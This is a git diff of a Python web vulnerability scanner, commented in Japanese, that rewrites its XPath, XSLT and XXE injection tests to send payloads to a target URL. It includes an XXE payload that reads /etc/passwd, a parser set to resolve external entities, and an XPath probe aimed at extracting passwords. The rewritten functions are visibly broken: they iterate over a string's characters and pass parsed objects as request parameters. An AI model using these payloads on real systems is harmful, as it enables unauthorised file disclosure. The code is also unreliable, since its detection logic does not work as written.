@@ -100,7 +100,7 @@ XSLT_PAYLOADS = [
     </xsl:stylesheet>
     '''
 ]
-XXE_PAYLOAD = """
+XXE_PAYLOADS = """
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
@@ -288,8 +288,6 @@ def test_unicode_injection(url, param):
             print(f"Not Found {payload}")
 
 
-#xPath and XSTL injection and XXE
-
 #xmlファイルのスクレイピング
 def scrape_xml(target_url):
     try:
@@ -314,79 +312,81 @@ def scrape_xml(target_url):
         print(f"Unexpected Error: {e}")
     return None
 
-#XPathインジェクション検証　　
-def test_xpath_injection(xml_data):
-    if xml_data is None:
-        print("No valid XML data provided for XPath Injection Test.")
-        return
-    
-    # XMLの読み込み
-    xml_root = etree.fromstring(xml_data)
 
+#XPathインジェクション検証　　
+def test_xpath_injection(url):
     for payload in XPATH_PAYLOADS:
         # 脆弱なXPathクエリ
         query = f"//user[username='{payload}']/password"
 
-        # XPathクエリを実行
-        result = xml_root.xpath(query)
+        #比較用のレスポンステキスト
+        response = requests.get(url)
+        result = response.text
 
-        if result:
-            print(f"[+] Injection Success with payload: {payload}")
-            for res in result:
-                print(f"  - Password: {res.text}")
-        else:
-            print(f"[-] Failed with payload: {payload}")
-
-
-    
-
-#XSLTインジェクション検証
-def test_xslt_injection(xml_data):
-    """
-    XSLT Injectionの検証関数
-    """
-    if xml_data is None:
-        print("No valid XML data provided for XSLT Injection Test.")
-        return
-
-    for payload in XSLT_PAYLOADS:
+        queries = {key: payload for key in (query or {})}
         try:
-            # XSLTのパース
-            xslt_root = etree.XML(payload)
-            transform = etree.XSLT(xslt_root)
+            response_parttern = requests.get(url, queries)
             
-            # XMLをXSLTで変換
-            xml_root = etree.XML(xml_data)
-            result = transform(xml_root)
-            
-            print("Payload Executed Successfully!")
-            print(result)
+            if response_parttern.status_code != response.status_code or response_parttern.text != result:
+                print(f'Found XPath Injection')
+                print(f"Tested payload: {payload} | Status: {response_parttern.status_code} ")
+            else:
+                print(f'Not Found | {payload}')
         except Exception as e:
-            print(f"Failed: {e}")
+            print(f"Error with payload {payload}: {e}") 
 
-#XXE 検証
-def test_xxe(xml_data):
-    """
-    XXE脆弱性を検証する関数。
+        
+    
+#リクエストされていない　インジェクションの仕方が謎
+#XSLTインジェクション検証
+def test_xslt_injection(url):
+   for payload in XSLT_PAYLOADS:
+        # XSLTのパース
+        xslt_root = etree.XML(payload)
+        xslt_doc = etree.XSLT(xslt_root)
+            
+        #比較用のレスポンステキスト
+        response = requests.get(url)
+        result = response.text
 
-    :param xml_payload: 攻撃を含むXMLデータ
-    """
+        try:
+            response_parttern = requests.get(url, xslt_doc)
+            
+            if response_parttern.status_code != response.status_code or response_parttern.text != result:
+                print(f'Found XSLT Injection')
+                print(f"Tested payload: {payload} | Status: {response_parttern.status_code} ")
+            else:
+                print(f'Not Found | {payload}')
+        except Exception as e:
+            print(f"Error with payload {payload}: {e}") 
+
+
+#XXE 検証　
+def test_xxe(url):
     print("=== Testing XXE Payload ===")
-    if xml_data is None:
-        print("No valid XML data provided for XXE Test.")
-        return
+    for payload in XXE_PAYLOADS:
+        #外部エンティティを含む特別に細工されたXMLに変換
+        try:
+            # XXE脆弱性があるパーサー
+            parser = etree.XMLParser(resolve_entities=True)  # 外部エンティティを解決する設定　取り扱い注意！
+            doc = etree.fromstring(payload, parser)
+            
+            #比較用のレスポンステキスト
+            response = requests.get(url)
+            result = response.text
 
-    try:
-        # XXE脆弱性があるパーサー
-        parser = etree.XMLParser(resolve_entities=True)  # 外部エンティティを解決する設定　取り扱い注意！
-
-        # XMLをパース
-        doc = etree.fromstring(xml_data, parser)
-        print("[+] XXE Successful! Leaked data:")
-        print(etree.tostring(doc, pretty_print=True).decode())
-    except Exception as e:
-        print(f"[-] Failed to parse: {e}")
-
+            try:
+                response_parttern = requests.get(url, doc)
+            
+                if response_parttern.status_code != response.status_code or response_parttern.text != result:
+                    print(f'Found XXE Injection')
+                    print(f"Tested payload: {payload} | Status: {response_parttern.status_code} ")
+                else:
+                    print(f'Not Found | {payload}')
+            except Exception as e:
+                print(f"Error with payload {payload}: {e}") 
+        except Exception as e:
+            print(f"[-] Failed to parse: {e}")
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
@@ -433,18 +433,14 @@ if __name__ == "__main__":
     print("=== Unicode Injection Test ===")
     test_unicode_injection(target_url, "username") 
     
-    print("Scan XML file......")
-    xml_data = scrape_xml(target_url)
-    if xml_data:
-        print("=== XPath Injection Test ===") 
-        test_xpath_injection(xml_data)
+    print("=== XPath Injection Test ===") 
+    test_xpath_injection(target_url)
 
-        print("===XSLT Injection Test ===") 
-        test_xslt_injection(xml_data)
+    print("===XSLT Injection Test ===") 
+    test_xslt_injection(target_url)
 
-        print("===XXE Test ===") 
-        test_xxe(xml_data)
-    else:
-        print("No valid XML data found. Skipping XML-related tests.")
+    print("===XXE Test ===") 
+    test_xxe(target_url)
+    
 
     print("Finish check!")
